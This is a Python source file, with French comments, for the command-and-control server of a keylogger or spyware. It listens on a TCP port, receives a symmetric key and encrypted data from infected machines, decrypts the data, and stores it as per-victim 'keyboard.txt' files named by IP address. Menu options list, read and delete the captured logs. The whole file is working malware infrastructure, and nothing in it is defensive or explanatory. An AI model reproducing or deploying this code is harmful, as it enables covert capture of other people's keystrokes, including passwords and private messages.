import socket
from cryptography.fernet import Fernet
import datetime
import os
import traceback
import argparse

class Server :
    """
    Cette classe représente un serveur espion capable d'écouter sur un port TCP pour recevoir
    des fichiers chiffrés, de les déchiffrer et de les manipuler en fonction
    des commandes spécifiées.

    Le serveur espion propose plusieurs fonctionnalités :
    - Écoute sur un port TCP pour recevoir des fichiers chiffrés.
    - Affichage des fichiers reçus.
    - Lecture du contenu d'un fichier spécifié.
    - Suppression de tous les fichiers reçus.

    Utilisation :
    -l, --listen    Se met en écoute sur un port TCP spécifié.
    -s, --show      Affiche les fichiers reçus par le spyware.
    -r, --readfile  Lit le contenu d'un fichier spécifié.
    -k, --kill      Supprime tous les fichiers reçus.
    """
    
    def receive_and_decrypt_file(self, server_port):
        """
        Cette fonction permet d'écouter sur le port (12345) sur le serveur pour recevoir 
        des fichiers chiffrés à l'aide d'une clé symétrique et de les déchiffrer avec cette clé.

        :param server_port: Le port sur lequel le serveur écoute les connexions entrantes.
        """
        server_socket = None  
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.bind(("0.0.0.0", server_port))
            server_socket.listen(1)

            print(f"Écoute du serveur sur le port {server_port}")

            while True:
                try:
                    client_socket, client_address = server_socket.accept()
                    print(f"Connexion depuis {client_address}")

                    key = client_socket.recv(1024)
                    cipher_suite = Fernet(key)

                    encrypted_text = b""
                    while True:
                        chunk = client_socket.recv(4096)
                        if not chunk:
                            break
                        encrypted_text += chunk

                    decrypted_text = cipher_suite.decrypt(encrypted_text)
                    directory = "Fichier"
                    os.makedirs(directory, exist_ok=True)

                    ip_personne = client_address[0]
                    filename = os.path.join(directory, f"{ip_personne}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt")

                    with open(filename, "wb") as file:
                        file.write(decrypted_text)

                    print(f"Fichier reçu, déchiffré et enregistré sous le nom de {filename} avec succès.")

                    stop_input = input("Entrez 'stop' pour arrêter l'écoute (-l) : ")
                    if stop_input.lower() == "stop":
                        break

                except KeyboardInterrupt:
                    print("Arrêt de l'écoute.")
                    break

        except Exception as e:
            traceback.print_exc()
            print(f"{e}")
        finally:
            if server_socket:
                server_socket.close()
                print("Fermeture du serveur.")

    def show_files(self):
        """
        Cette fonction affiche la liste des fichiers reçus dans le répertoire spécifié (Fichier).
        Si aucun fichier n'a été reçu ou si le répertoire n'existe pas, un message est affiché.
        """
        directory = "Fichier"
        if os.path.exists(directory):
            files = os.listdir(directory)
            if files:
                print("Liste des fichiers reçus :")
                for file in files:
                    print(file)
            else:
                print("Aucun fichier n'a encore été reçu.")
        else:
            print("Aucun fichier n'a encore été reçu.")

    def read_file(self,file_name):
        """
        Cette fonction lit le contenu du fichier spécifié dans le répertoire des fichiers reçus.
        Si le fichier existe, son contenu est lu et affiché.
        Si le fichier est introuvable, un message d'erreur est affiché.

        :param file_name: Le nom du fichier à lire.
        """
        directory = "Fichier"
        file_path = os.path.join(directory, file_name)
        if os.path.exists(file_path):
            with open(file_path, "rb") as file:
                content = file.read()
                print(f"Contenu du fichier {file_name}:\n{content.decode('utf-8')}")
        else:
            print(f"Fichier {file_name} introuvable.")

    def kill_server(self):
        """
        Cette fonction supprime tous les fichiers présents dans le répertoire spécifié.
        Si des fichiers sont présents, ils sont supprimés un par un.
        Si aucun fichier n'est trouvé, un message est affiché.

        """
        directory = "Fichier"
        if os.path.exists(directory):
            files = os.listdir(directory)
            for file in files:
                file_path = os.path.join(directory, file)
                os.remove(file_path)
            print("Tous les fichiers supprimés.")
        else:
            print("Aucun fichier à supprimer.")

    def menu(self):
        """
        Cette fonction implémente un menu en ligne de commande pour les opérations du spyware.
        Les options incluent l'écoute sur un port TCP, l'affichage des fichiers reçus, la lecture du contenu d'un fichier
        spécifié et la suppression de tous les fichiers reçus.

        Utilisation :
        -l, --listen    Se met en écoute sur un port TCP spécifié.
        -s, --show      Affiche les fichiers reçus par le spyware.
        -r, --readfile  Lit le contenu d'un fichier spécifié.
        -k, --kill      Supprime tous les fichiers reçus.

        """
        parser = argparse.ArgumentParser(description="Server espion.")
        parser.add_argument("-l", "--listen", type=int, help="Se met en écoute sur un port TCP")
        parser.add_argument("-s", "--show", action="store_true", help="Affiche les fichiers réceptionnés par le spyware.")
        parser.add_argument("-r", "--readfile", help="Lire le contenue du fichier spécifié.")
        parser.add_argument("-k", "--kill", action="store_true", help="Supprime tous les fichiers récéptionner.")

        args = parser.parse_args()

        if args.listen:
            self.receive_and_decrypt_file(args.listen)
        elif args.show:
            self.show_files()
        elif args.readfile:
            self.read_file(args.readfile)
        elif args.kill:
            self.kill_server()
        else:
            parser.print_help()

if __name__ == "__main__":
    server = Server()
    server.menu()
